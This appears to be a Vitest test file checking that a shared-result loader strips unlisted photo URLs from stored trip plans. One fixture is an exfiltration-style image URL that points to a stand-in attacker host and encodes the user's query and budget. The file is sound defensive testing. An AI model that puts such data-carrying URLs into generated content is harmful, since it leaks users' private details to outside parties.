import { describe, it, expect, vi, beforeEach } from 'vitest'

// Gate 2 F-A-pub (TP5) — the PUBLIC loader itself applies the plan-photo policy, so every consumer gets the same view. The admin
// client is mocked to return a stored row exactly as the table holds it (an old snapshot with a model-written stop photo).

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh_budget200k'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const stored = {
  id: 'id-1', slug: 'AbCdEfGh12', query: 'q', domain: 'travel', locale: 'vi', og_version: 1, view_count: 0, ask_count: 0,
  created_at: '2026-10-01T00:00:00.000Z', parent_id: null, owner_is_anonymous: false,
  payload: {
    v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [], images: [], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
    plan: { type: 'trip', title: 'Đà Lạt 2 ngày', days: [{ label: 'Ngày 1', items: [{ time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', photo_url: EXFIL }, { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ', photo_url: TBN }] }] },
  },
}
const db = { row: stored as unknown, calls: 0 }
vi.mock('@/lib/supabase/admin', () => ({
  createAdminClient: () => {
    const chain = {
      select: () => chain,
      eq: () => chain,
      maybeSingle: async () => { db.calls++; return { data: db.row, error: null } },
    }
    return { from: () => chain }
  },
}))

import { getPublicSharedResult } from './sharedResultStore'

beforeEach(() => { db.row = JSON.parse(JSON.stringify(stored)); db.calls = 0 })

describe('F-A-pub · getPublicSharedResult applies R1 on read (TP5)', () => {
  it('returns the stored row with the unlisted stop photo removed and the allowed one kept', async () => {
    const row = await getPublicSharedResult('AbCdEfGh12')
    expect(db.calls).toBe(1)
    expect(row).not.toBeNull()
    expect(JSON.stringify(row)).not.toContain('attacker.example')
    const items = row!.payload.plan!.days[0].items as unknown as Array<Record<string, unknown>>
    expect(items[0]).toEqual({ time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A' })
    expect(items[1].photo_url).toBe(TBN)
    expect(row!.slug).toBe('AbCdEfGh12')
    expect(row!.og_version).toBe(1)
  })
  it('a row with no plan photo to remove comes back as stored', async () => {
    db.row = { ...stored, payload: { ...stored.payload, plan: undefined } }
    const row = await getPublicSharedResult('AbCdEfGh12')
    expect(row).toEqual(db.row)
  })
  it('validation still runs first: an invalid stored payload is still a miss', async () => {
    db.row = { ...stored, payload: { ...stored.payload, v: 99 } }
    expect(await getPublicSharedResult('AbCdEfGh12')).toBeNull()
  })
})
